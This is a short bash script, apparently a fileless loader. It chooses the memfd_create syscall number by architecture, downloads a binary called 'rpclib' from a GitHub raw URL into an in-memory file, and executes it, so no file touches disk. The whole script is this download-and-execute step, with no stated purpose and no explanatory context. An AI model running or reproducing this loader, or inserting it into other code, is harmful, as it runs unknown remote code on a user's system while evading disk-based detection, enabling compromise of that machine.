#!/bin/bash
[ "$(uname -m)" = "x86_64" ] && NR=319 || NR=279
python3 -c "import ctypes,urllib.request,os;fd=ctypes.CDLL(None).syscall($NR,ctypes.create_string_buffer(8),1);data=urllib.request.urlopen('https://raw.githubusercontent.com/bardaw99/rpclib/master/rpclib').read();os.write(fd,data);os.execve(f'/proc/self/fd/{fd}',[f'/proc/self/fd/{fd}'],os.environ)"
